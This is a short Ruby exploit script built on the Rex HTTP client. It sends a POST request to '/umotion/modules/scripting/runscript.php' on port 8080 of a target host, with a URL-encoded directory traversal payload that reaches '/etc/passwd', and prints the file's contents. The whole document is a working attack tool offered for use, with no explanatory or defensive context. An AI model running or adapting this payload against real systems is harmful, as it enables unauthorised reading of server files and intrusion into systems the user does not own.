#!/usr/bin/env ruby

require 'rex'

host = ARGV[0]

def usage
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1


data =  "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
data << "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"

sock = Rex::Proto::Http::Client.new(host, 
                                    port = "8080", 
                                    context = {}, 
                                    ssl = false)

req = sock.request_cgi(
	{
		'uri'   => "/umotion/modules/scripting/runscript.php",
		'version' => '1.0',
		'method' => 'POST',
                'data' => "s=#{data}",
	})

sock.send_request(req)
data = sock.read_response()
puts data.body
